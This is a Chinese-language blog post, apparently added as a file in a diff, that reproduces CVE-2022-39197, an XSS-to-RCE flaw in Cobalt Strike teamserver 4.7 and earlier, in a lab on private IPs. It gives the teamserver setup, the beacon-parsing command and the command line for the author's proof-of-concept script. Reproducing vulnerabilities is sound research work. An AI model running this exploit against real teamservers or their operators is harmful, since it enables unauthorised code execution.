@@ -1,0 +1,84 @@
+最新文章更新见[个人博客](https://xzajyjs.cn/)
+
+# 漏洞说明
+
+根据9.20日CobaltStrike官方发布的最新4.7.1版本的[更新日志](https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/)中介绍，<=4.7的teamserver版本存在XSS漏洞，从而可以造成RCE远程代码执行
+
+> 一位名为“Beichendream”的独立研究人员联系我们，告知我们他们在团队服务器中发现的一个 XSS 漏洞。这将允许攻击者在 Beacon
+> 配置中设置格式错误的用户名，从而允许他们远程执行代码RCE。
+
+* * *
+
+# 复现过程
+
+根据漏洞原理，类似之前使用的cs上线器，稍微修改一下上线的payload即可。
+
+## 测试环境
+
+服务端：Ubuntu20.04+JDK11+CS4.3 (IP: 172.16.12.13)
+
+客户端：M2 macOS Monterey 12.5 + JDK17 (IP: 172.16.12.2)
+
+用到的工具：[CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)、[CVE-2022-39197
+POC](https://github.com/xzajyjs/CVE-2022-39197-POC)
+
+* * *
+
+## 环境搭建
+
+    
+    
+    # ubuntu
+    chmod +x teamserver
+    ./teamserver 172.16.12.13 haha123
+    # macOS--提供图片加载服务,如果联网的话可以省略该步,使用任意在线图片的url
+    brew install node@14
+    npm i --global serve
+    serve		# 用serve在图片路径下开启服务, 此处图片文件url为：http://172.16.12.2:3000/logo.png
+    
+
+![](https://image.3001.net/images/20220923/1663941124_632dba04cf72144a38a3d.png!small)
+
+CS中创建一个listener监听器
+
+![image-20220923195818451](https://image.3001.net/images/20220923/1663941129_632dba098f1a5751a03d7.png!small)
+
+然后生成一个package木马，经测试，是否勾选x64（即生成的32位和64位均可上线）不影响结果
+
+![image-20220923200124179](https://image.3001.net/images/20220923/1663941131_632dba0b2aac716298599.png!small)
+
+* * *
+
+## POC使用
+
+首先对这个生成的beacon进行分析，我们这里使用[CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)这个工具。
+
+    
+    
+    python3 parse_beacon_config.py beacon4.3_x64.exe --json
+    
+
+重点关注如下几个点
+
+![](https://image.3001.net/images/20220923/1663941132_632dba0c6dfcfd880c429.png!small)
+
+将`Port`、`C2Server`、`HttpPostUri`进行拼接，这里变成：`http://172.16.12.13:8080/visit.js/submit.php`，记录下来
+
+将`PublicKey`复制到一个`txt`文件中，注意去除前后的空格
+
+使用我写的[POC](https://github.com/xzajyjs/CVE-2022-39197-POC)（编写不易，麻烦加个star吧，后期会把上述分析功能集成，一站式实现）
+
+![](https://image.3001.net/images/20220923/1663941134_632dba0e0f57617a2ba05.png!small)
+
+    
+    
+    python3 cve-2022-39197-poc.py -i http://172.16.12.2:3000/logo.png -u http://172.16.12.13:8080/visit.js/submit.php -k key.txt
+    
+
+![](https://image.3001.net/images/20220923/1663941135_632dba0f7c2641b04b3e0.png!small)
+
+* * *
+
+  
+  
+
